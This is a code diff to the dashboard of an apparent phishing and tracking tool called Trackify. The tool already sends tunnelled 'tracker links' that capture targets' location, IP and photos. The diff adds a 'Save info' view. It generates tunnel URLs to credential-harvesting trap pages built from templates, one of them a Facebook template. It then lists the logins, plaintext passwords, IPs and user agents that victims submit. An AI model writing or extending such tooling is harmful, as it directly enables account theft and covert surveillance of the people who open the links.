@@ -576,6 +576,26 @@ $userNavInitial = $userNavInitial ?? '?';
             gap: 12px;
             margin-top: 16px;
         }
+        .tunnel-controls-wrap {
+            margin-top: 16px;
+        }
+        .tunnel-controls-wrap .link-box {
+            margin-top: 0;
+            width: 100%;
+        }
+        .tunnel-link-group {
+            display: flex;
+            flex: 1;
+            min-width: 0;
+            gap: 12px;
+            align-items: stretch;
+        }
+        .link-box.link-box--stop-only .tunnel-link-group {
+            display: none;
+        }
+        .link-box.link-box--stop-only {
+            justify-content: flex-end;
+        }
         .link-box .btn {
             height: 44px;
             min-width: 44px;
@@ -1175,6 +1195,38 @@ $userNavInitial = $userNavInitial ?? '?';
             padding: 40px;
             overflow-y: auto;
         }
+        .saved-info-wrap {
+            overflow-x: auto;
+            margin-top: 8px;
+        }
+        .saved-info-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+        .saved-info-table th,
+        .saved-info-table td {
+            text-align: left;
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border);
+            vertical-align: top;
+            word-break: break-word;
+        }
+        .saved-info-table th {
+            color: var(--text-muted);
+            font-weight: 600;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+        .saved-info-table tbody tr:hover td {
+            background: rgba(88, 166, 255, 0.06);
+        }
+        .saved-info-empty {
+            color: var(--text-muted);
+            padding: 24px 0;
+            text-align: center;
+        }
         .phone-layout-inner {
             max-width: 1680px;
             margin: 0 auto;
@@ -1442,6 +1494,9 @@ $userNavInitial = $userNavInitial ?? '?';
             <button type="button" class="side-nav-item" id="navItemIp" onclick="switchView('ip')" title="IP Lookup">
                 🌐
             </button>
+            <button type="button" class="side-nav-item" id="navItemSaveInfo" onclick="switchView('saveinfo')" title="Save info">
+                🔑
+            </button>
             <div class="side-nav-spacer" aria-hidden="true"></div>
             <a href="account-settings.php" class="side-nav-item" title="Account settings">⚙</a>
             <div class="side-nav-disclaimer-wrap">
@@ -1512,10 +1567,14 @@ $userNavInitial = $userNavInitial ?? '?';
                     <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                     <span>Generate</span>
                 </button>
-                <div id="linkBox" class="link-box" style="display:none">
-                    <input type="text" class="link-input" id="trackerLink" readonly>
-                    <button class="btn btn-secondary" onclick="copyLink()">Copy</button>
-                    <button class="btn btn-danger" id="stopBtn" onclick="stopService()">Stop</button>
+                <div id="tunnelControlsWrap" class="tunnel-controls-wrap" style="display:none">
+                    <div id="linkBox" class="link-box">
+                        <div id="trackerLinkGroup" class="tunnel-link-group">
+                            <input type="text" class="link-input" id="trackerLink" readonly>
+                            <button type="button" class="btn btn-secondary" onclick="copyLink()">Copy</button>
+                        </div>
+                        <button type="button" class="btn btn-danger" id="stopBtn" onclick="stopService()" style="display:none">Stop tunnel</button>
+                    </div>
                 </div>
             </div>
 
@@ -1651,6 +1710,52 @@ $userNavInitial = $userNavInitial ?? '?';
                 </div>
             </div>
         </section>
+
+        <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Save info">
+            <div class="phone-layout-inner">
+                <div class="phone-layout-columns">
+                    <div class="card">
+                        <h2>Save info</h2>
+                        <p style="margin:8px 0 16px;color:var(--text-muted);font-size:14px;line-height:1.5">
+                            Templates live in <code style="font-size:12px">saveinfo-templates/</code> (not Trackify). Pick one, generate a tunnel, and share the URL ending in <code style="font-size:12px">saveinfo_entry.php</code> — it redirects to the matching <code style="font-size:12px">saveinfo-trap-…</code> page. Trackify root is unchanged. Up to <span id="savedInfoMax">500</span> stored submissions.
+                        </p>
+                        <div class="phone-lookup-input-wrap">
+                            <label for="siTemplate">Template</label>
+                            <select id="siTemplate">
+                                <option value="">Loading templates…</option>
+                            </select>
+                        </div>
+                        <div id="siTemplateHint" class="phone-lookup-error" style="margin-top:8px;border:none;padding:0;color:var(--text-muted);font-size:13px" hidden></div>
+                        <div class="phone-lookup-actions" style="margin-top:16px">
+                            <button type="button" class="btn btn-primary btn-generate" id="siGenerateBtn" onclick="generateSaveInfoLink()">
+                                <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                                <span>Generate</span>
+                            </button>
+                        </div>
+                        <div id="siLinkBox" class="link-box" style="display:none;margin-top:16px">
+                            <input type="text" class="link-input" id="siTrackerLink" readonly>
+                            <button type="button" class="btn btn-secondary" onclick="copySaveInfoLink()">Copy</button>
+                            <button type="button" class="btn btn-danger" id="siStopBtn" onclick="stopService()">Stop</button>
+                        </div>
+                        <div id="saveInfoTerminalWrap" class="phone-lookup-results" style="margin-top:20px" aria-live="polite">
+                            <div class="phone-lookup-terminal" id="saveInfoTerminal">
+                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Tunnel activity and submissions (shared with Trackify when using one tunnel).</div>
+                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:save-info# </span><span class="terminal-cursor"></span></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="phone-history">
+                        <div class="phone-history-title">Saved submissions</div>
+                        <div class="phone-lookup-actions" style="margin-bottom:12px">
+                            <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()" style="width:100%">Clear all saved entries</button>
+                        </div>
+                        <div id="savedInfoWrap" class="saved-info-wrap" aria-live="polite">
+                            <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Save info URL and submit the form on the trap page.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
     <div class="lightbox" id="lightbox" onclick="closeLightbox()" role="dialog" aria-modal="true" aria-label="Full size capture">
@@ -1713,10 +1818,38 @@ $userNavInitial = $userNavInitial ?? '?';
         }
 
         const terminalEl = document.getElementById('terminal');
+        const saveInfoTerminalEl = document.getElementById('saveInfoTerminal');
         const linkBox = document.getElementById('linkBox');
+        const tunnelControlsWrap = document.getElementById('tunnelControlsWrap');
         const trackerLinkInput = document.getElementById('trackerLink');
+
+        function syncTrackifyTunnelRow(link, showStop) {
+            const wrap = tunnelControlsWrap || document.getElementById('tunnelControlsWrap');
+            const box = linkBox || document.getElementById('linkBox');
+            const stopBtnEl = document.getElementById('stopBtn');
+            if (!wrap || !box) {
+                return;
+            }
+            const hasLink = !!(link && String(link).trim());
+            if (!hasLink && !showStop) {
+                wrap.style.display = 'none';
+                box.style.display = 'none';
+                box.classList.remove('link-box--stop-only');
+                if (stopBtnEl) {
+                    stopBtnEl.style.display = 'none';
+                }
+                return;
+            }
+            wrap.style.display = 'block';
+            box.style.display = 'flex';
+            box.classList.toggle('link-box--stop-only', !hasLink && showStop);
+            if (stopBtnEl) {
+                stopBtnEl.style.display = showStop ? 'inline-flex' : 'none';
+            }
+        }
         const generateBtn = document.getElementById('generateBtn');
         const GENERATE_BTN_IDLE_HTML = '<svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg><span>Generate</span>';
+        const SI_GENERATE_BTN_IDLE_HTML = GENERATE_BTN_IDLE_HTML;
         const statusDisplay = document.getElementById('statusDisplay');
         const statusLink = document.getElementById('statusLink');
         const capturesList = document.getElementById('capturesList');
@@ -1746,6 +1879,98 @@ $userNavInitial = $userNavInitial ?? '?';
 
         document.getElementById('ytVideoId').addEventListener('change', function() {
             syncPayloadOptions();
+        });
+
+        async function loadSaveInfoTemplates() {
+            const sel = document.getElementById('siTemplate');
+            const hint = document.getElementById('siTemplateHint');
+            if (!sel) {
+                return;
+            }
+            try {
+                const res = await fetch(API + '?action=saveinfo_templates', { credentials: 'same-origin' });
+                const data = await res.json().catch(() => ({}));
+                if (data.status !== 'success' || !Array.isArray(data.templates)) {
+                    sel.innerHTML = '<option value="">Could not load templates</option>';
+                    return;
+                }
+                const prev = sel.value;
+                sel.innerHTML = '';
+                let n = 0;
+                data.templates.forEach(function (t) {
+                    if (!t.readable) {
+                        return;
+                    }
+                    const o = document.createElement('option');
+                    o.value = t.slug;
+                    o.textContent = t.label;
+                    sel.appendChild(o);
+                    n++;
+                });
+                if (n === 0) {
+                    sel.innerHTML = '<option value="">No templates found</option>';
+                    if (hint) {
+                        hint.hidden = false;
+                        hint.textContent = 'Add .html files under saveinfo-templates/ and register them in api.php (saveinfo_templates_registry).';
+                    }
+                    return;
+                }
+                if (hint) {
+                    hint.hidden = true;
+                }
+                const hasOpt = function (val) {
+                    return val && Array.prototype.some.call(sel.options, function (o) { return o.value === val; });
+                };
+                let pick = null;
+                if (hasOpt(data.active_template)) {
+                    pick = data.active_template;
+                } else if (hasOpt(prev)) {
+                    pick = prev;
+                } else if (sel.options[0] && sel.options[0].value) {
+                    pick = sel.options[0].value;
+                }
+                if (pick) {
+                    sel.value = pick;
+                }
+                await syncSaveInfoPayload({ silent: true });
+            } catch (e) {
+                sel.innerHTML = '<option value="">Load failed</option>';
+            }
+        }
+
+        async function syncSaveInfoPayload(options) {
+            const silent = options && options.silent;
+            const sel = document.getElementById('siTemplate');
+            if (!sel || !sel.value) {
+                return;
+            }
+            const formData = new FormData();
+            formData.append('template', sel.value);
+            try {
+                const res = await fetch(API + '?action=saveinfo_update_payload', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'same-origin'
+                });
+                const data = await res.json().catch(() => ({}));
+                if (data.status === 'success') {
+                    if (data.regenerated && data.payload_ok && !silent) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template + '" is live. Re-open your Save info URL or hard-refresh the trap page (Ctrl+F5).', 'green');
+                    }
+                    if (data.regenerated && data.payload_ok === false) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[!] Save info template files not updated — check saveinfo-templates/ and saveinfo_entry.php permissions', 'dim');
+                    }
+                } else if (data.status === 'error' && data.message && !silent) {
+                    const skip = 'Generate a Save info link first';
+                    if (String(data.message).indexOf(skip) === -1) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[!] ' + data.message, 'dim');
+                    }
+                }
+            } catch (e) {}
+        }
+
+        document.getElementById('siTemplate').addEventListener('change', function() {
+            syncSaveInfoPayload({ silent: false });
         });
 
         let telegramPersisted = false;
@@ -1908,17 +2133,53 @@ $userNavInitial = $userNavInitial ?? '?';
             }
         });
 
-        function addTerminalLine(text, cls = '') {
+        function addTerminalLineTo(rootEl, text, cls) {
+            if (!rootEl) {
+                return;
+            }
             const line = document.createElement('div');
             line.className = 'phone-lookup-terminal-line' + (cls ? ' ' + cls : '');
             line.textContent = '  ' + text;
-            const prompt = terminalEl.querySelector('.phone-lookup-terminal-line:last-child');
+            const prompt = rootEl.querySelector('.phone-lookup-terminal-line:last-child');
             if (prompt) {
-                terminalEl.insertBefore(line, prompt);
+                rootEl.insertBefore(line, prompt);
             } else {
-                terminalEl.appendChild(line);
+                rootEl.appendChild(line);
             }
-            terminalEl.scrollTop = terminalEl.scrollHeight;
+            rootEl.scrollTop = rootEl.scrollHeight;
+        }
+
+        function addTerminalLine(text, cls) {
+            addTerminalLineTo(terminalEl, text, cls == null ? '' : cls);
+        }
+
+        function appendTerminalEventToRoot(rootEl, ev) {
+            if (!rootEl) {
+                return;
+            }
+            if (ev.type === 'location') {
+                addTerminalLineTo(rootEl, '', 'green');
+                addTerminalLineTo(rootEl, '[+] New Target Opened the Link!', 'green');
+                ev.content.split('\n').forEach(function (l) {
+                    if (l.trim()) {
+                        addTerminalLineTo(rootEl, l, 'cyan');
+                    }
+                });
+            } else if (ev.type === 'ip') {
+                addTerminalLineTo(rootEl, '', 'green');
+                addTerminalLineTo(rootEl, '[+] Target opened the link!', 'green');
+                ev.content.split('\n').forEach(function (l) {
+                    if (l.trim()) {
+                        addTerminalLineTo(rootEl, l, 'cyan');
+                    }
+                });
+            } else if (ev.type === 'photo') {
+                addTerminalLineTo(rootEl, '', 'green');
+                addTerminalLineTo(rootEl, '[+] Victim\'s Photo Received!', 'green');
+            } else if (ev.type === 'saved_login') {
+                addTerminalLineTo(rootEl, '', 'green');
+                addTerminalLineTo(rootEl, '[+] ' + ev.content, 'green');
+            }
         }
 
         async function generateLink() {
@@ -1981,20 +2242,20 @@ $userNavInitial = $userNavInitial ?? '?';
                     } else if (data.template_id != null) {
                         addTerminalLine('[+] Template #' + data.template_id + ' → /' + (data.trap_file || 'trap-?.html') + ' (if wrong page: hard refresh or private window)', 'dim');
                     }
-                    linkBox.style.display = 'flex';
                     trackerLinkInput.value = data.link;
+                    syncTrackifyTunnelRow(data.link, true);
                     addTerminalLine('', 'green');
                     addTerminalLine('[+] Tracker Link: ' + data.link, 'green');
                     addTerminalLine('', 'green');
                     addTerminalLine('[*] Waiting for targets, Press Ctrl + C to exit...', 'yellow');
                     statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                     statusLink.textContent = data.link;
-                    document.getElementById('stopBtn').style.display = 'inline-flex';
                     document.getElementById('stopBtnSidebar').style.display = 'block';
                     generateBtn.disabled = false;
                     generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                     loadPhotos(1);
                     loadCaptures();
+                    checkStatus();
                     return;
                 }
             }
@@ -2008,6 +2269,137 @@ $userNavInitial = $userNavInitial ?? '?';
             generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
         }
 
+        async function generateSaveInfoLink() {
+            const siBtn = document.getElementById('siGenerateBtn');
+            if (!siBtn) {
+                return;
+            }
+            siBtn.disabled = true;
+            siBtn.innerHTML = '<span>Starting tunnel...</span>';
+            addTerminalLineTo(saveInfoTerminalEl, '[+] Save info: starting or reusing Cloudflare tunnel...', 'yellow');
+
+            const siSel = document.getElementById('siTemplate');
+            const slug = siSel && siSel.value;
+            if (!slug) {
+                addTerminalLineTo(saveInfoTerminalEl, '[!] Select a Save info template first.', 'dim');
+                siBtn.disabled = false;
+                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('template', slug);
+
+            try {
+                const startRes = await fetch(API + '?action=saveinfo_start', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'same-origin'
+                });
+                const startData = await startRes.json().catch(() => ({}));
+                if (startData.status === 'error') {
+                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (startData.message || 'Start failed'), 'dim');
+                    siBtn.disabled = false;
+                    siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+                    return;
+                }
+                if (startData.status === 'ready' && startData.link) {
+                    const siLinkBox = document.getElementById('siLinkBox');
+                    const siInput = document.getElementById('siTrackerLink');
+                    const siStop = document.getElementById('siStopBtn');
+                    if (startData.reused_tunnel) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[+] Reusing existing tunnel.', 'yellow');
+                    }
+                    if (startData.payload_ok === false) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[!] Tunnel OK but saveinfo trap files were not written — check project permissions', 'dim');
+                    } else if (startData.template_slug) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + startData.template_slug + '" → /' + (startData.trap_file || 'saveinfo-trap-?.html'), 'dim');
+                    }
+                    if (siLinkBox) {
+                        siLinkBox.style.display = 'flex';
+                    }
+                    if (siInput) {
+                        siInput.value = startData.link;
+                    }
+                    if (siStop) {
+                        siStop.style.display = 'inline-flex';
+                    }
+                    addTerminalLineTo(saveInfoTerminalEl, '', 'green');
+                    addTerminalLineTo(saveInfoTerminalEl, '[+] Save info URL: ' + startData.link, 'green');
+                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this URL (not the site root).', 'yellow');
+                    siBtn.disabled = false;
+                    siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+                    checkStatus();
+                    return;
+                }
+            } catch (e) {
+                addTerminalLineTo(saveInfoTerminalEl, '[!] Error: ' + e.message, 'dim');
+                siBtn.disabled = false;
+                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+                return;
+            }
+
+            addTerminalLineTo(saveInfoTerminalEl, '[+] Waiting for tunnel URL...', 'yellow');
+            pollForSaveInfoLink();
+        }
+
+        async function pollForSaveInfoLink() {
+            const siBtn = document.getElementById('siGenerateBtn');
+            let lastExcerpt = '';
+            for (let i = 0; i < 90; i++) {
+                await new Promise(function (r) { setTimeout(r, 1000); });
+                const res = await fetch(API + '?action=saveinfo_link', { credentials: 'same-origin' });
+                const data = await res.json();
+                if (data.tunnel_log_excerpt) {
+                    lastExcerpt = data.tunnel_log_excerpt;
+                }
+                if (data.status === 'forbidden' || data.status === 'error') {
+                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (data.message || 'Could not get Save info link'), 'dim');
+                    if (siBtn) {
+                        siBtn.disabled = false;
+                        siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+                    }
+                    return;
+                }
+                if (data.link) {
+                    if (data.payload_ok === false) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[!] Tunnel is up but saveinfo-trap-*.html was not written — fix permissions', 'dim');
+                    } else if (data.template_slug) {
+                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template_slug + '" → /' + (data.trap_file || 'saveinfo-trap-?.html'), 'dim');
+                    }
+                    const siLinkBox = document.getElementById('siLinkBox');
+                    const siInput = document.getElementById('siTrackerLink');
+                    const siStop = document.getElementById('siStopBtn');
+                    if (siLinkBox) {
+                        siLinkBox.style.display = 'flex';
+                    }
+                    if (siInput) {
+                        siInput.value = data.link;
+                    }
+                    if (siStop) {
+                        siStop.style.display = 'inline-flex';
+                    }
+                    addTerminalLineTo(saveInfoTerminalEl, '', 'green');
+                    addTerminalLineTo(saveInfoTerminalEl, '[+] Save info URL: ' + data.link, 'green');
+                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this URL (saveinfo_entry.php).', 'yellow');
+                    if (siBtn) {
+                        siBtn.disabled = false;
+                        siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+                    }
+                    checkStatus();
+                    return;
+                }
+            }
+            addTerminalLineTo(saveInfoTerminalEl, '[!] Timeout: no tunnel URL (90s).', 'dim');
+            if (lastExcerpt) {
+                addTerminalLineTo(saveInfoTerminalEl, '[!] cloudflared log: ' + lastExcerpt, 'dim');
+            }
+            if (siBtn) {
+                siBtn.disabled = false;
+                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
+            }
+        }
+
         async function stopService() {
             const stopBtn = document.getElementById('stopBtn');
             const stopBtnSidebar = document.getElementById('stopBtnSidebar');
@@ -2019,17 +2411,33 @@ $userNavInitial = $userNavInitial ?? '?';
                 if (data.status === 'success') {
                     addTerminalLine('', 'dim');
                     addTerminalLine('[+] Tunnel stopped.', 'dim');
-                    linkBox.style.display = 'none';
+                    addTerminalLineTo(saveInfoTerminalEl, '', 'dim');
+                    addTerminalLineTo(saveInfoTerminalEl, '[+] Tunnel stopped (Save info URL no longer valid).', 'dim');
                     trackerLinkInput.value = '';
+                    syncTrackifyTunnelRow(null, false);
                     statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
                     statusLink.textContent = '';
-                    stopBtn.style.display = 'none';
                     stopBtnSidebar.style.display = 'none';
+                    const siBox = document.getElementById('siLinkBox');
+                    const siIn = document.getElementById('siTrackerLink');
+                    const siSt = document.getElementById('siStopBtn');
+                    if (siBox) {
+                        siBox.style.display = 'none';
+                    }
+                    if (siIn) {
+                        siIn.value = '';
+                    }
+                    if (siSt) {
+                        siSt.style.display = 'none';
+                    }
                     const toast = document.getElementById('toast');
                     toast.textContent = 'Tunnel stopped';
                     toast.style.background = 'var(--accent-yellow)';
                     toast.classList.add('show');
                     setTimeout(() => { toast.classList.remove('show'); toast.style.background = ''; }, 2000);
+                } else {
+                    const msg = (data && data.message) ? data.message : 'Stop failed';
+                    addTerminalLine('[!] ' + msg, 'dim');
                 }
             } catch (e) {
                 addTerminalLine('[!] Error stopping: ' + e.message, 'dim');
@@ -2102,13 +2510,33 @@ $userNavInitial = $userNavInitial ?? '?';
             showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
         }
 
+        function copySaveInfoLink() {
+            const input = document.getElementById('siTrackerLink');
+            const link = input && input.value;
+            if (!link) {
+                return;
+            }
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(link).then(function () {
+                    showCopyResult(true);
+                }).catch(function () {
+                    showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
+                });
+                return;
+            }
+            showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
+        }
+
         function switchView(which) {
             const trackifyLayout = document.getElementById('trackifyLayout');
             const phoneLayout = document.getElementById('phoneLayout');
             const ipLayout = document.getElementById('ipLayout');
+            const saveInfoLayout = document.getElementById('saveInfoLayout');
             const navTrackify = document.getElementById('navItemTrackify');
             const navPhone = document.getElementById('navItemPhone');
             const navIp = document.getElementById('navItemIp');
+            const navSaveInfo = document.getElementById('navItemSaveInfo');
 
             if (!trackifyLayout || !phoneLayout || !ipLayout || !navTrackify || !navPhone || !navIp) return;
 
@@ -2117,27 +2545,47 @@ $userNavInitial = $userNavInitial ?? '?';
             navTrackify.classList.remove('active');
             navPhone.classList.remove('active');
             navIp.classList.remove('active');
+            if (navSaveInfo) {
+                navSaveInfo.classList.remove('active');
+            }
 
             if (which === 'phone') {
                 trackifyLayout.style.display = 'none';
                 phoneLayout.style.display = 'block';
                 ipLayout.style.display = 'none';
+                if (saveInfoLayout) {
+                    saveInfoLayout.style.display = 'none';
+                }
                 navPhone.classList.add('active');
                 loadPhoneHistory();
             } else if (which === 'ip') {
                 trackifyLayout.style.display = 'none';
                 phoneLayout.style.display = 'none';
                 ipLayout.style.display = 'block';
+                if (saveInfoLayout) {
+                    saveInfoLayout.style.display = 'none';
+                }
                 navIp.classList.add('active');
                 setTimeout(function () {
                     if (typeof ipLookupLeafletMap !== 'undefined' && ipLookupLeafletMap) {
                         try { ipLookupLeafletMap.invalidateSize(); } catch (e) {}
                     }
                 }, 250);
+            } else if (which === 'saveinfo' && saveInfoLayout && navSaveInfo) {
+                trackifyLayout.style.display = 'none';
+                phoneLayout.style.display = 'none';
+                ipLayout.style.display = 'none';
+                saveInfoLayout.style.display = 'block';
+                navSaveInfo.classList.add('active');
+                loadSaveInfoTemplates();
+                loadSavedInfo();
             } else {
                 trackifyLayout.style.display = 'grid';
                 phoneLayout.style.display = 'none';
                 ipLayout.style.display = 'none';
+                if (saveInfoLayout) {
+                    saveInfoLayout.style.display = 'none';
+                }
                 navTrackify.classList.add('active');
             }
         }
@@ -2826,6 +3274,69 @@ $userNavInitial = $userNavInitial ?? '?';
             }
         }
 
+        async function loadSavedInfo() {
+            const wrap = document.getElementById('savedInfoWrap');
+            const maxEl = document.getElementById('savedInfoMax');
+            if (!wrap) {
+                return;
+            }
+            try {
+                const res = await fetch(API + '?action=saved_info', { credentials: 'same-origin' });
+                const data = await res.json().catch(() => ({}));
+                if (data.status !== 'success' || !Array.isArray(data.entries)) {
+                    wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
+                    return;
+                }
+                if (maxEl && data.max_entries != null) {
+                    maxEl.textContent = String(data.max_entries);
+                }
+                if (data.entries.length === 0) {
+                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a link with the Facebook template and submit the form on the trap page.</div>';
+                    return;
+                }
+                let html = '<table class="saved-info-table"><thead><tr><th>Time (UTC)</th><th>Login</th><th>Password</th><th>Template</th><th>IP</th><th>User agent</th></tr></thead><tbody>';
+                data.entries.forEach(function (row) {
+                    html += '<tr><td>' + escapeHtmlText(row.at || '') + '</td><td>' + escapeHtmlText(row.login || '') + '</td><td>' + escapeHtmlText(row.password || '') + '</td><td>' + escapeHtmlText(row.template || '') + '</td><td>' + escapeHtmlText(row.ip || '') + '</td><td>' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
+                });
+                html += '</tbody></table>';
+                wrap.innerHTML = html;
+            } catch (e) {
+                wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
+            }
+        }
+
+        async function clearSavedInfo() {
+            if (!confirm('Clear all saved login entries for your account? This cannot be undone.')) {
+                return;
+            }
+            const btn = document.getElementById('clearSavedInfoBtn');
+            if (btn) {
+                btn.disabled = true;
+            }
+            try {
+                const res = await fetch(API + '?action=clear_saved_info', {
+                    method: 'POST',
+                    credentials: 'same-origin'
+                });
+                const data = await res.json().catch(() => ({}));
+                if (data.status !== 'success') {
+                    alert(data.message || 'Could not clear saved entries');
+                    return;
+                }
+                await loadSavedInfo();
+                const toast = document.getElementById('toast');
+                toast.textContent = 'Saved entries cleared';
+                toast.classList.add('show');
+                setTimeout(function () { toast.classList.remove('show'); }, 2000);
+            } catch (err) {
+                alert('Could not clear: ' + (err && err.message ? err.message : String(err)));
+            } finally {
+                if (btn) {
+                    btn.disabled = false;
+                }
+            }
+        }
+
         (function initSupportPrompt() {
             const prompt = document.getElementById('supportPrompt');
             const continueBtn = document.getElementById('supportContinueBtn');
@@ -2882,16 +3393,49 @@ $userNavInitial = $userNavInitial ?? '?';
             try {
                 const res = await fetch(API + '?action=status', { credentials: 'same-origin' });
                 const data = await res.json();
+                const stopBtnSidebarEl = document.getElementById('stopBtnSidebar');
                 if (data.link) {
                     statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                     statusLink.textContent = data.link;
-                    linkBox.style.display = 'flex';
                     trackerLinkInput.value = data.link;
-                    document.getElementById('stopBtn').style.display = 'inline-flex';
-                    document.getElementById('stopBtnSidebar').style.display = 'block';
                 } else {
-                    document.getElementById('stopBtn').style.display = 'none';
-                    document.getElementById('stopBtnSidebar').style.display = 'none';
+                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
+                    statusLink.textContent = '';
+                    trackerLinkInput.value = '';
+                }
+                syncTrackifyTunnelRow(data.link, !!data.show_stop_tunnel);
+                if (data.show_stop_tunnel) {
+                    if (stopBtnSidebarEl) {
+                        stopBtnSidebarEl.style.display = 'block';
+                    }
+                } else {
+                    if (stopBtnSidebarEl) {
+                        stopBtnSidebarEl.style.display = 'none';
+                    }
+                }
+                const siBox = document.getElementById('siLinkBox');
+                const siIn = document.getElementById('siTrackerLink');
+                const siSt = document.getElementById('siStopBtn');
+                if (data.saveinfo_link) {
+                    if (siBox) {
+                        siBox.style.display = 'flex';
+                    }
+                    if (siIn) {
+                        siIn.value = data.saveinfo_link;
+                    }
+                    if (siSt) {
+                        siSt.style.display = 'inline-flex';
+                    }
+                } else {
+                    if (siBox) {
+                        siBox.style.display = 'none';
+                    }
+                    if (siIn) {
+                        siIn.value = '';
+                    }
+                    if (siSt) {
+                        siSt.style.display = 'none';
+                    }
                 }
             } catch (e) {}
         }
@@ -2905,17 +3449,13 @@ $userNavInitial = $userNavInitial ?? '?';
                     for (const ev of data.events) {
                         if (lastTerminalEvents.includes(ev.type + ev.content)) continue;
                         lastTerminalEvents.push(ev.type + ev.content);
-                        if (ev.type === 'location') {
-                            addTerminalLine('', 'green');
-                            addTerminalLine('[+] New Target Opened the Link!', 'green');
-                            ev.content.split('\n').forEach(l => l.trim() && addTerminalLine(l, 'cyan'));
-                        } else if (ev.type === 'ip') {
-                            addTerminalLine('', 'green');
-                            addTerminalLine('[+] Target opened the link!', 'green');
-                            ev.content.split('\n').forEach(l => l.trim() && addTerminalLine(l, 'cyan'));
-                        } else if (ev.type === 'photo') {
-                            addTerminalLine('', 'green');
-                            addTerminalLine('[+] Victim\'s Photo Received!', 'green');
+                        appendTerminalEventToRoot(terminalEl, ev);
+                        appendTerminalEventToRoot(saveInfoTerminalEl, ev);
+                        if (ev.type === 'saved_login') {
+                            const sil = document.getElementById('saveInfoLayout');
+                            if (sil && sil.style.display === 'block') {
+                                loadSavedInfo();
+                            }
                         }
                     }
                 }
